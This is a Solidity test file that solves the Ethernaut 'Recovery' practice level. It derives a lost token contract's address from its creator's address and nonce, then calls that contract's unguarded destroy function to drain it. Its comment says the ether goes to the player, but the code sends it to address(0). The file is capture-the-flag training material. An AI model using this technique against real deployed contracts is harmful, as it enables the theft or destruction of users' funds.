pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Recovery/RecoveryFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract RecoveryTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testRecovery() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        RecoveryFactory recoveryFactory = new RecoveryFactory();
        ethernaut.registerLevel(recoveryFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(recoveryFactory);
        Recovery ethernautRecovery = Recovery(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Get the SimpleToken address from the Recovery contract address
        address _simpleTokenAddr = address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), levelAddress, uint8(0x01))))));
        SimpleToken _simpleToken = SimpleToken(payable(_simpleTokenAddr));
        
        // Recover the ether: destroy the SimpleToken contract, sending any existing balance to address specified (the player)
        _simpleToken.destroy(payable(address(0)));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
